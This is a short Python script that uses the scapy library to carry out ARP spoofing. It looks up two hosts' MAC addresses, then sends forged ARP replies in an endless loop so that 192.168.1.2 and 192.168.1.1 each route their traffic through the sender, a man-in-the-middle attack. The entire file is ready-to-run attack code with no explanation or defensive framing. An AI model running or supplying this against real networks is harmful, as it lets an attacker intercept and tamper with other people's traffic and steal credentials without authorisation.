#!usr/bin/env python
#run it in Python 3!

from scapy.layers import all as scapy
import time

timeout = 3
def get_mac(ip, timeout):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=timeout, verbose=False)[0]

    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip, timeout)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet)

while True:
    spoof("192.168.1.2", "192.168.1.1")
    spoof("192.168.1.1", "192.168.1.2")
    time.sleep(2)

